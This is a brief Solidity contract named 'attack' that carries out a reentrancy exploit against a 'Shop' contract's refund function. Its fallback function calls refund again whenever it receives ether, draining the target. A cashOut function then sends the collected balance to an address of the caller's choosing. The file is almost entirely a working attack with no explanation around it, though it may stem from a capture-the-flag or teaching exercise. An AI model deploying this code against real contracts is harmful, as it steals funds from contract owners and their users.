pragma solidity ^0.6.0;

// use an interface because thats good programming
interface Shop {
    function refund(uint item, uint quantity) external payable;
}

contract attack {
    Shop public shop;
    uint public target = 0;

    // initialize the contract with the address of the Shop contract
    constructor(address payable addr) public {
        shop = Shop(addr);
    }

    // fallback function
    fallback() external payable {
        shop.refund(target, 1);
    }
    // start the exploit by calling the refund function of the Shop contract for reentrancy attack
    function exploit() public payable {
        shop.refund(target, 1);
    }

    // withdraw the contract's balance to a specified address
    function cashOut(address payable addr) external {
        addr.transfer(address(this).balance);
    }
}
